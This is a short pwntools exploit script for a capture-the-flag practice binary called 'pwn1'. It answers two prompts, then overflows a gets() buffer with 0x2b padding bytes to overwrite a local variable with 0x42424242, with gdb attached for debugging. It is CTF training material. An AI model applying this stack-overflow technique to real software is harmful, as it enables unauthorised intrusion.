# Import pwntools
from pwn import *
context.terminal = ['tmux', 'splitw', '-h']

# Establish the target process
target = process('./pwn1')
gdb.attach(target, 'b *main+361')

# Make the payload
payload = ""
payload += "0"*0x2b # Padding to `local_18`
payload += p32(0x42424242) # The value we will overwrite local_18 with, in little endian

# Send the strings to reach the gets call
target.sendline("Sir Lancelot of Camelot")
target.sendline("To seek the Holy Grail.")

# Send the payload
target.sendline(payload)

target.interactive()
